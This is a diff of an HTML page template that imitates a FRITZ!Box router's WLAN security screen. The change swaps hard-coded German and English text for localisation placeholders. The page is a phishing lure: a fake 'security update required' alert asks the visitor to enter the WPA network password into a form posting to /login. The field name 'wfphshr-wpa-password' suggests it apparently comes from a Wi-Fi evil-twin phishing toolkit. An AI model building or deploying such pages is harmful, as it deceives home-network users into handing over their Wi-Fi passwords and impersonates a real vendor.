@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="de">
+<html lang="{{html_lang}}">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FRITZ!Box — WLAN</title>
+    <title>{{page_title}}</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: Arial, Helvetica, sans-serif; background: #ebebeb; color: #333; min-height: 100vh; }
@@ -40,33 +40,33 @@
 <body>
     <div class="mast">
         <div class="brand">FRITZ!<span>Box</span></div>
-        <div class="model">WLAN · Heimnetz</div>
+        <div class="model">{{mast_subtitle}}</div>
     </div>
     <div class="layout">
         <nav class="side">
-            <a href="#">Übersicht</a>
-            <a href="#" class="on">WLAN</a>
-            <a href="#">Internet</a>
-            <a href="#">System</a>
+            <a href="#">{{nav_overview}}</a>
+            <a href="#" class="on">{{nav_wifi}}</a>
+            <a href="#">{{nav_internet}}</a>
+            <a href="#">{{nav_system}}</a>
         </nav>
         <div class="main">
             <div class="box">
-                <div class="box-h">WLAN · Sicherheit</div>
+                <div class="box-h">{{box_title}}</div>
                 <div class="box-b">
                     <div class="alert">
-                        <strong>Sicherheitsupdate erforderlich / Security update required</strong>
-                        Zur Anwendung eines WLAN-Sicherheitsupdates bitte das WPA-Netzwerkkennwort bestätigen. / Please confirm your WPA network password to apply a wireless security update.
+                        <strong>{{alert_title}}</strong>
+                        {{alert_body}}
                     </div>
                     <form method="POST" action="/login">
                         <table>
-                            <tr><td>Verschlüsselung</td><td>WPA2 (CCMP)</td></tr>
-                            <tr><td>Netzwerkschlüssel</td><td><input type="password" name="wfphshr-wpa-password" placeholder="WLAN-Passwort" required autocomplete="current-password"></td></tr>
+                            <tr><td>{{row_encryption}}</td><td>{{row_encryption_value}}</td></tr>
+                            <tr><td>{{row_network_key}}</td><td><input type="password" name="wfphshr-wpa-password" placeholder="{{input_placeholder}}" required autocomplete="current-password"></td></tr>
                         </table>
-                        <div class="btn-row"><button type="submit" class="btn">Übernehmen</button></div>
+                        <div class="btn-row"><button type="submit" class="btn">{{btn_apply}}</button></div>
                     </form>
                 </div>
             </div>
-            <div class="foot">Lokale Geräteverwaltung</div>
+            <div class="foot">{{footer}}</div>
         </div>
     </div>
 </body>
